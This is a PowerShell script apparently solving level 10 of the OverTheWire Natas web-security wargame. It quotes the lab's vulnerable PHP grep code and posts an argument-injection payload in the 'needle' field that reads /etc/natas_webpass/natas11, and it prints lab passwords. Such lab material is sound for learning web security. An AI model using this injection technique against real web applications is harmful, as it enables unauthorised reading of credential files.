
<#
Script to retrieve the password of level 9-10

#>
$url = "http://natas10.natas.labs.overthewire.org"
$creds = "natas10:nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds"}

#------------------------------------------------------------
 # $a = (Invoke-WebRequest -uri $url -Method Post -Body $sec -proxy "http://localhost:8080" -Headers $headers).content 
# $a
# res  <form>
# Find words containing: <input name=needle><input type=submit name=submit value=Search><br><br>
# </form>
# Output:
# <pre>
# </pre>
# <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
#------------------------------------------------------------


# Get source
# --------------------------------------------------------------------------------
# $url += "/index-source.html"
# $a = (Invoke-WebRequest -uri $url -Method Get -proxy "http://localhost:8080" -Headers $headers).content 
# $clean = [System.Web.HttpUtility]::HtmlDecode($a).split("<br />")
# $clean

# </form>


# Output:
# <pre>
# <?
# $key = "";

# if(array_key_exists("needle", $_REQUEST)) {
#     $key = $_REQUEST["needle"];
# }

# if($key != "") {
#     if(preg_match('/[;|&]/',$key)) {
#         print "Input contains an illegal character!";
#     } else {
#         passthru("grep -i $key dictionary.txt");
#     }
# }
# ?>

# --------------------------------------------------------------------------------

# $parms = @{"needle" = "b3twiise 0x00  cat /etc/natas_webpass/natas10"; "submit" = ""}
$parms = @{"needle" = " -E '\w{32}' /etc/natas_webpass/natas11" ;"submit" = ""}


$a = (Invoke-WebRequest -uri $url -Method Post -Body $parms -proxy "http://localhost:8080" -Headers $headers).content 


$passwd = ($a | select-string -AllMatches "(\w{20,})").matches[1]


echo "The password for natas10 is $passwd"

# PS /home/voltron/OTW/natas/pshell_lang>  ./natas11.ps1 
# The password for natas11 is U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK                                                                                  
# PS /home/voltron/OTW/natas/pshell_lang>
